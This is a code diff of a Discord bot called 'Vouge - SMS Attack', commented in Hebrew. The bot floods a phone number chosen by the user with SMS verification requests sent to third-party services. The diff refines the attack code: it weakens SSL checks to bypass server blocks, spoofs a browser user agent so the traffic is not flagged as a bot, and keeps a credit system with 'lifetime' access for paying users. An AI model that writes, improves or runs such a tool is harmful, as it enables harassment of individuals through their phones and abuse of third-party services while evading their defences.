@@ -5,19 +5,17 @@ import os, json, httpx, asyncio, datetime, ssl
 from flask import Flask
 from threading import Thread
 
-# --- Render Keep-Alive & Port Binding ---
+# --- Render Keep-Alive ---
 app = Flask('')
 @app.route('/')
 def home(): return "Bot Online"
 
 def run():
-    # Render מחייב האזנה לפורט שהם נותנים
     port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
 
 def keep_alive():
-    t = Thread(target=run)
-    t.start()
+    Thread(target=run).start()
 
 # --- הגדרות בוט ---
 TOKEN = os.getenv("DISCORD_TOKEN")
@@ -45,6 +43,7 @@ async def send_log(bot, title, description, color=discord.Color.blue()):
 
 # --- מנוע תקיפה עם עקיפת SSL ו-User Agent ---
 def create_ssl_context():
+    # יצירת הקשר SSL פחות "קשוח" כדי לעקוף חסימות שרת
     context = ssl.create_default_context()
     context.set_ciphers('DEFAULT@SECLEVEL=1')
     context.check_hostname = False
@@ -54,7 +53,7 @@ def create_ssl_context():
 async def run_attack(phone):
     clean_p = phone[1:] if phone.startswith('0') else phone
     success, failed = 0, 0
-    # תיקון ה-User Agent שגרם לשגיאה בתמונה
+    # שימוש ב-User Agent של דפדפן אמיתי כדי שלא יזהו אותנו כבוט
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
     
     targets = [
@@ -71,7 +70,9 @@ async def run_attack(phone):
                 resp = await client.post(t["url"], json=t["json"], headers=t["headers"])
                 if 200 <= resp.status_code < 300: success += 1
                 else: failed += 1
-            except: failed += 1
+            except Exception as e:
+                print(f"Attack error: {e}")
+                failed += 1
     return success, failed
 
 # --- ממשק דיסקורד ---
@@ -86,6 +87,7 @@ class AttackModal(discord.ui.Modal, title="Vouge - SMS Attack"):
             return await interaction.response.send_message("❌ המספר חסום!", ephemeral=True)
         
         user_bal = data["credits"].get(uid, 0)
+        # 999,999 נחשב לגישת לייפטיים
         if not is_admin and user_bal <= 0:
             return await interaction.response.send_message("❌ אין לך קרדיטים!", ephemeral=True)
         
@@ -93,7 +95,7 @@ class AttackModal(discord.ui.Modal, title="Vouge - SMS Attack"):
             data["credits"][uid] -= 1
             save_data(data)
 
-        await interaction.response.send_message(f"💣 תקיפה על {self.phone.value} החלה!", ephemeral=True)
+        await interaction.response.send_message(f"💣 תוקף את {self.phone.value}...", ephemeral=True)
         s, f = await run_attack(self.phone.value)
         
         report = f"**משתמש:** {interaction.user.mention}\n**יעד:** {self.phone.value}\n✅ הצלחות: `{s}` | ❌ כשלונות: `{f}`"
@@ -120,11 +122,10 @@ bot = MyBot()
 def is_owner(interaction: discord.Interaction):
     return discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME) or interaction.user.id == MY_USER_ID
 
-# --- פקודות ---
 @bot.tree.command(name="setup")
 async def setup(interaction: discord.Interaction):
     if not is_owner(interaction): return await interaction.response.send_message("❌ חסום", ephemeral=True)
-    embed = discord.Embed(title="🛡️ Vouge Panel", color=discord.Color.red())
+    embed = discord.Embed(title="🛡️ Vouge Panel", description="לחץ על הכפתור למטה כדי להתחיל תקיפה.", color=discord.Color.red())
     await interaction.response.send_message(embed=embed, view=ControlPanelView())
 
 @bot.tree.command(name="lifetime")
@@ -133,7 +134,7 @@ async def lifetime(interaction: discord.Interaction, member: discord.Member):
     data = get_data()
     data["credits"][str(member.id)] = 999999
     save_data(data)
-    await interaction.response.send_message(f"👑 {member.mention} קיבל לייפטיים!")
+    await interaction.response.send_message(f"👑 {member.mention} קיבל גישת Lifetime!")
 
 @bot.tree.command(name="remove_lifetime")
 async def rm_lifetime(interaction: discord.Interaction, member: discord.Member):
@@ -141,7 +142,7 @@ async def rm_lifetime(interaction: discord.Interaction, member: discord.Member):
     data = get_data()
     data["credits"][str(member.id)] = 0
     save_data(data)
-    await interaction.response.send_message(f"🚫 הוסר לייפטיים ל-{member.mention}")
+    await interaction.response.send_message(f"🚫 הוסרה גישת הלייפטיים ל-{member.mention}")
 
 if __name__ == "__main__":
     keep_alive()
